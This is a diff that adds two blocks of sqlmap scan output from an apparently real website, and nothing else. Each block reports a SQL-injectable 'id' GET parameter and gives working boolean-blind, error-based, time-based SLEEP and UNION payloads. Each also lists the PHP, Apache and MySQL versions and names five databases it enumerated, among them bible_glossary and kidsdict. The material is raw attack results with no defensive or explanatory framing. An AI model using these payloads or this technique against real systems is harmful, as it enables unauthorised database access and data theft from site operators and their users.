@@ -26,3 +26,59 @@ available databases [5]:
 [*] keywords
 [*] kidsdict
 
+sqlmap identified the following injection point(s) with a total of 65 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 3955=3955&rct=j&q=&esrc=s
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: id=2 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178627a71,(SELECT (ELT(1494=1494,1))),0x71717a6271,0x78))s), 8446744073709551610, 8446744073709551610)))&rct=j&q=&esrc=s
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2 AND SLEEP(5)&rct=j&q=&esrc=s
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 1 column
+    Payload: id=2 UNION ALL SELECT CONCAT(0x7178627a71,0x7259556b586b73476f49546e74756d62536f4b516e784b6a6862467876636471694e457050764a62,0x71717a6271)#&rct=j&q=&esrc=s
+---
+web application technology: PHP 5.5.35, Apache 2.4.18
+back-end DBMS: MySQL >= 5.5
+available databases [5]:
+[*] bible_glossary
+[*] bible_history
+[*] information_schema
+[*] keywords
+[*] kidsdict
+
+sqlmap identified the following injection point(s) with a total of 66 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 3245=3245
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: id=2 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71787a7a71,(SELECT (ELT(8224=8224,1))),0x71766b7171,0x78))s), 8446744073709551610, 8446744073709551610)))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 1 column
+    Payload: id=2 UNION ALL SELECT CONCAT(0x71787a7a71,0x4342784b6e4a6e415341785a4d774941594f6a4e6a6f69534b626242524c746478656e4750436c78,0x71766b7171)#
+---
+web application technology: PHP 5.5.35, Apache 2.4.18
+back-end DBMS: MySQL >= 5.5
+available databases [5]:
+[*] bible_glossary
+[*] bible_history
+[*] information_schema
+[*] keywords
+[*] kidsdict
+
